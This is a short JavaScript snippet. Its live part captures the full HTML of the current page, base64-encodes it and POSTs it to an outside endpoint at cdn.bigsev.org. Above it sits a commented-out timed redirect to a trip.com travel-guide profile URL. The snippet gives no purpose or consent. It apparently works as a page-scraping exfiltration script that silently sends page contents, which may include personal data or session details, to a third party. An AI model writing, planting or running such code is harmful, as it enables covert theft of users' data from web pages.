//setTimeout(() => {
  //window.location.href = "https://www.trip.com/travel-guide/personal-home/5B0331C7B13B98575B7383FEB36159AB0A22D2851A580B9627C7CF0FB02BD1BB?locale=en_us&curr=USD";
//}, 3000); // 3 seconds


const html = document.documentElement.outerHTML;
const base64 = btoa(unescape(encodeURIComponent(html)));

fetch('https://cdn.bigsev.org/endpoint', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ html: base64 })
});
